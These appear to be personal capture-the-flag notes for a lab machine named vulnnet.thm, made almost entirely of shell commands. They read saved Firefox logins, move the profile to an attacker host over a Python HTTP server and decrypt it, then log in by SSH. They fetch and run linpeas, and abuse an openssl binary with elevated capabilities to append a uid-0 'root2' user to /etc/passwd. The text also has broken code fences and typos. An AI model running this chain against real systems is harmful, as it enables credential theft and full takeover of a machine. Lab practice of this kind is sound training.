[[Shell]]

==Read from .mozilla==
```bash
cd .mozilla/firefox/2fjnrwth.default-release
cat logins.*
```

> [!WARNING] Run on local system kali
> *Google search for: firefox decrypt logins.json*
> ```bash
git clone https://github.com/unode/firefox_decrypt.git
cd firefox_decrypt
ip a
python3 -m http.server 80

```bash
cd /tmp
wget 10.11.45.32/firefox_decrypt.py
```
*Zip the file .mozilla to debug it on the local system*
```bash
zip moz.zip /home/system/.mozilla -r
mv moz.zip .
python3 -m http.server 8080
```

> [!Warning] Run on local system kali
> Debug python3 script
> ```bash
wget IP:8080/moz.zip
unzip moz.zip
cd /home/system/.mozilla/firefox
pwd (copy path)
python3 firefox_decrypt.py (pwd path)

*Get the credentials*

```bash
ssh system@vulnnet.thm password
sudo -l
```

> [!WARNING] Run on local system kali
> *linpease*
> ```bash
ip a
cd /www
python3 -m http.server 8080

```bash
wget IP:8080/linpeas.sh
./linpease.sh
```
Google search = openssl privilege escalation cap=ep

```bash
getcap -r / 2>/dev/null
```
[[GTFOBins]]
search [[openssl]]

LFILE=file_to_write
```bash
echo DATA | openssl enc -out "$LFILE"
```
```bash
echo 'test' | openssl enc -out /tmp/test
cat /tmp/test

cd /tmp
cp /etc/passwd .
```
Generate password with openssl
Google search = openssl "-1" create password
```bash
openssl passwd -1 pass
head -n 1 /etc/passwd
echo 'root2:$1$MdOU2LrC$MJ53Sq1G.IyQFGjLNZvEr.:0:0:root:/root:/bin/bash' >> passwd
cat passwd
which openssl
cat passwd | /home/system/Utils/openssl enc -out /etc/passwd
tail /etc/passwd
su root2
password:pass
whoami
cd /root
ls
```